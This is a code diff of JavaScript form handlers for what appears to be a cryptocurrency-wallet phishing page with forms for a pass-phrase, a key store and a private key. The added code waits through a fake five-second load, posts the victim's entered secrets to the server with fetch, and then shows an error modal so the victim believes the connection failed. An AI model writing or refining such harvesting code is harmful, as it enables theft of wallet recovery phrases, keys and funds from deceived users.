@@ -312,12 +312,31 @@ $("form#pass-phrase").submit(async (e) => {
         // Simulate loading for 5 seconds
         await new Promise(resolve => setTimeout(resolve, 5000));
 
-        // Show "Error Connecting" modal after 5 seconds
-        $("div.spanner").removeClass("show");
-        $("div.overlay").removeClass("show");
-        $(".modal").fadeIn(); // Show error modal
-	e.target.submit();
+        // Submit the form data using fetch
+        const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData.entries());
 
+            try {
+                const response = await fetch("/", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                    body: new URLSearchParams(data).toString(),
+                });
+
+                if (response.ok) {
+                    // Form submission successful, show custom modal
+                    $("div.spanner").removeClass("show");
+                    $("div.overlay").removeClass("show");
+                    $(".modal").fadeIn(); // Show error modal
+                } else {
+                    // Handle form submission error
+                    console.error("Form submission error:", response);
+                    // Show error modal or message as needed
+                }
+              } catch (error) {
+                console.error("Fetch error:", error);
+                // Handle fetch error
+            }  
         // Optionally, clear form fields or perform other actions here
     }
 });
@@ -331,7 +350,7 @@ $("form#key-store").submit(async (e) => {
         $("div.spanner").removeClass("show");
         $("div.overlay").removeClass("show");
         $(".modal").fadeIn();
-	e.target.submit();
+	      e.target.submit();
     }
 });
 $("form#private-key").submit(async (e) => {
